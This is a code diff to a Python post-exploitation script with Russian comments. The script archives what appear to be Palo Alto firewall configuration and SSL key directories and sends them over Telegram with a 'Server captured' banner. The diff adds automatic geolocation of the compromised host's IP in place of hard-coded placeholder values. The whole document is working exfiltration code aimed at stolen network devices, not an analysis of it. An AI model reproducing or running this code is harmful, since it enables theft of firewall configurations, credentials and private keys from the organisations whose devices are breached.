@@ -2,6 +2,7 @@ import requests
 import os
 import tarfile
 import io
+import hashlib
 
 def archive_directory(directory_path):
     """
@@ -62,6 +63,23 @@ def send_telegram_message(message, file_paths):
 
 def main():
     try:
+        # Получаем IP из внешнего ресурса
+        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
+        ip = ip_info["query"]
+        country = ip_info["country"]
+        city = ip_info["city"]
+
+        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()
+
+        # Формируем сообщение
+        message = "🟢 Server captured\n"
+        message += f"------------------\n"
+        message += f"IP: {ip}\n"
+        message += f"Country: {country}\n"
+        message += f"City: {city}\n"
+        message += f"------------------\n"
+        message += f"#{str(ip_hash)[:8]}"  # Используем хэш IP
+
         # Пути к директориям
         directories_to_archive = ["/opt/pancfg/mgmt/saved-configs", "/opt/pancfg/mgmt/ssl"]
         
@@ -75,15 +93,6 @@ def main():
             archived_files.append(archive_path)
 
         if archived_files:
-            # Формируем сообщение
-            message = "🟢 Server captured\n"
-            message += f"------------------\n"
-            message += f"IP: 192.168.1.1\n"  # Тут вставьте свой IP
-            message += f"Country: Some Country\n"  # Тут вставьте страну
-            message += f"City: Some City\n"  # Тут вставьте город
-            message += f"------------------\n"
-            message += f"#{hash('192.168.1.1')[:8]}"
-
             # Отправка сообщений и файлов
             success = send_telegram_message(message, archived_files)
             if success:
